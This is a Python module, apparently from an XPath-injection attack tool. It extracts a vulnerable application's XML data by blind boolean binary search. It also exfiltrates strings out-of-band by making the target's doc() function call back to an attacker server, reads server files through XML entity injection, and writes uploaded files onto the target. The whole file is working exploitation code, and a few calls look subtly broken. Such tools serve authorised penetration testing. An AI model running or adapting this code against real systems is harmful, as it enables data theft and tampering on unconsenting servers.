import asyncio
import base64
import string as stdlib_string

from xcat.attack import AttackContext, check
from xpath import ROOT_NODE
from xpath.functions import (concat, count as xpath_count, doc, encode_for_uri,
                             normalize_space, string, string_length,
                             string_to_codepoints, substring, substring_before)
from xpath.functions.fs import base_64_binary, write_binary

from .display import XMLNode

ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
MISSING_CHARACTER = "?"


async def count(context: AttackContext, expression, func=xpath_count):
    if context.features['oob-http']:
        result = await get_string_via_oob(context, string(func(expression)))
        if result is not None and result.isdigit():
            return int(result)

    return await binary_search(context, func(expression), min=0)


async def get_char(context: AttackContext, expression):
    if context.features['codepoint-search']:
        return await codepoint_search(context, expression)
    elif context.features['substring-search']:
        return await substring_search(context, expression)
    else:
        # Dumb search
        top_characters = "".join(c[0] for c in context.common_characters.most_common())
        search_space = top_characters + "".join(c for c in ASCII_SEARCH_SPACE if c not in top_characters)

        for space in search_space:
            if await check(context, expression == space):
                context.common_characters[space] += 1
                return space


async def get_common_string(context: AttackContext, expression, length):
    if length >= 10:
        return

    common_names = [item[0] for item in context.common_strings.most_common()
                    if len(item[0]) == length][:5]
    if common_names:
        futures = [check(context, expression == common_name) for common_name in common_names]
        results = zip(await asyncio.gather(*futures), common_names)

        for result, name in results:
            if result:
                context.common_strings[name] += 1
                return name


async def get_string(context: AttackContext, expression, disable_normalization=False):
    if context.features['normalize-space'] and not disable_normalization:
        expression = normalize_space(expression)

    if context.features['oob-http']:
        result = await get_string_via_oob(context, expression)
        if result is not None:
            return result
        else:
            pass

    total_string_length = await count(context, expression, func=string_length)

    if total_string_length == 0:
        return ""

    # Try common strings we've got before
    result = await get_common_string(context, expression, total_string_length)
    if result is not None:
        return result

    fetch_length = total_string_length if not context.fast_mode else min(15, total_string_length)

    chars_futures = [
        get_char(context, substring(expression, i, 1))
        for i in range(1, fetch_length + 1)
    ]

    chars = await asyncio.gather(*chars_futures)

    result = "".join(
        char if char is not None else MISSING_CHARACTER
        for char in chars
    )

    if context.fast_mode and fetch_length != total_string_length:
        difference = total_string_length - fetch_length
        return f'{result}... ({difference} more characters)'
    else:
        if len(result) <= 10:
            context.common_strings[result] += 1

    return result


async def upload_file_via_oob(context: AttackContext, remote_path, file_bytes: bytes):
    encoded = base64.encodebytes(file_bytes)
    server = await requester.get_oob_server()
    url, future = server.expect_file_download(encoded.decode())

    await check(context, write_binary(remote_path, base_64_binary(doc(url) / 'data')))

    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return False


async def get_string_via_oob(context: AttackContext, expression):
    server = await requester.get_oob_server()
    url, future = server.expect_data()

    oob_expr = doc(concat(f'{url}?d=', encode_for_uri(expression))) / 'data' == server.test_response_value
    if not await check(context, oob_expr):
        return None

    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return None


async def get_file_via_entity_injection(context: AttackContext, file_path):
    server = await requester.get_oob_server()
    url, future = server.expect_entity_injection('SYSTEM "{file_path}"'.format(file_path=file_path))

    return await get_string_via_oob(context, doc(url) / 'data')


def iterate_all(context: AttackContext, expressions):
    for text in expressions:
        yield get_string(context, text)


async def get_all_text(context: AttackContext, expression):
    text_node_count = await count(context, expression.text)
    text_contents = await asyncio.gather(
        *iterate_all(context, expression.text(text_node_count))
    )

    return "".join(text_contents)


async def get_node_comments(context: AttackContext, expression):
    comments_count = await count(context, expression.comments)

    futures = [get_string(context, comment) for comment in expression.comments(comments_count)]

    return await asyncio.gather(*futures)


async def binary_search(context: AttackContext, expression, min, max=25):
    if await check(context, expression > max):
        return await binary_search(context, expression, min, max * 2)

    while True:
        if max < min:
            return -1

        midpoint = (min + max) // 2

        if await check(context, expression < midpoint):
            max = midpoint - 1
        elif await check(context, expression > midpoint):
            min = midpoint + 1
        else:
            return midpoint


async def substring_search(context: AttackContext, expression):
    # Small issue:
    # string-length(substring-before('abc','z')) == 0
    # string-length(substring-before('abc','a')) == 0
    # So we need to explicitly check if the expression is equal to the first char in our search space.
    # Not optimal, but still works out fairly efficient.

    if await check(expression == ASCII_SEARCH_SPACE[0]):
        return ASCII_SEARCH_SPACE[0]

    result = await binary_search(
        context,
        string_length(substring_before(ASCII_SEARCH_SPACE, expression)),
        min=0,
        max=len(ASCII_SEARCH_SPACE))
    if result == 0:
        return None
    else:
        return ASCII_SEARCH_SPACE[result]


async def codepoint_search(context: AttackContext, expression):
    result = await binary_search(
        context,
        expression=string_to_codepoints(expression),
        min=0,
        max=255)
    if result == 0:
        return None
    else:
        return chr(result)


async def get_nodes(context: AttackContext, starting_path=ROOT_NODE):
    attributes, child_node_count, text_content, comments, node_name = await asyncio.gather(
        get_node_attributes(context, starting_path),
        count(context, starting_path.children),
        get_all_text(context, starting_path),
        get_node_comments(context, starting_path),
        get_string(context, starting_path.name)
    )
    return (XMLNode(name=node_name, attributes=attributes, text=text_content, comments=comments),
            [get_nodes(context, starting_path=child) for child in starting_path.children(child_node_count)])


async def get_node_attributes(context: AttackContext, node):
    attribute_count = await count(context, node.attributes)

    async def _get_attributes_task(attr):
        return await asyncio.gather(get_string(context, attr.name), get_string(context, attr))

    results = await asyncio.gather(*[_get_attributes_task(attr) for attr in node.attributes(attribute_count)])

    return dict(results)
